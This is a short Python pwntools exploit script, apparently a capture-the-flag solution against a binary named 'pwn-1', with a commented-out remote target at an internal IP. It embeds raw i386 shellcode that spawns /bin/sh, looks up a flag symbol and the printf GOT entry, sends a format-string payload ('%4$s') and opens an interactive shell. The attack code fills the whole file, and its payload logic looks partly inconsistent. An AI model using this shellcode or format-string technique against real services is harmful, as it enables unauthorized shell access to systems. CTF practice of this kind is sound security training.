from pwn import *

e = ELF('./pwn-1')
p = process('./pwn-1')
#p = remote('10.0.41.31',9999)

shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#shellcode = asm(shellcraft.i386.linux.sh())

flag_addr = e.symbols['flag']
printf_addr = e.got['printf']

#payload = fmtstr_payload(4,{printf_addr:flag_addr},write_size='short')
payload = ''
payload += shellcode
payload += '%4$s'
print p.recvuntil('my word?\n')
p.sendline(payload)
p.interactive()